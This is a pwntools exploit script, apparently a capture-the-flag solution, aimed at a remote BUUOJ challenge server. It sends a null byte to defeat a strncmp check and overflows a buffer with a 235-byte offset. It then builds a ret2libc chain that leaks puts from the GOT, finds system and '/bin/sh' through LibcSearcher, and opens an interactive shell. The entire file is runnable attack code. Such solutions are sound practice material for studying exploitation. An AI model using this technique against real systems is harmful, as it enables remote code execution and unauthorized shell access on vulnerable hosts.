from pwn import *
from LibcSearcher import *
context.arch = 'i386'

# p = process('./pwn')
p = remote('node3.buuoj.cn',27152)

payload = '\x00'	# strncmp will be stoped by character '\x00'
payload += 'a'*6 + p16(0xff)	
# padding to the walue of funtion retn (eax), 
# and make our input length under control

p.send(payload)
p.recv()

elf = ELF('./pwn')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = 0x08048825

payload = 'A'*(235) + p32(puts_plt) + p32(main) + p32(puts_got)	
# the offset need debugger to find
# leak the puts addr in menmory
p.send(payload)
puts_addr = u32(p.recvuntil('\n',drop=True))
log.success('puts_addr = %#x',puts_addr)

libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
log.info('system_addr = %#x, binsh_addr = %#x'%(system_addr,binsh_addr))

payload = '\x00'	# strncmp will be stoped by character '\x00'
payload += 'a'*6 + p16(0xff)
p.send(payload)
p.recv()

payload = 'A'*(235) + p32(system_addr) + p32(main) + p32(binsh_addr)
p.send(payload)
sleep(1)
p.interactive()
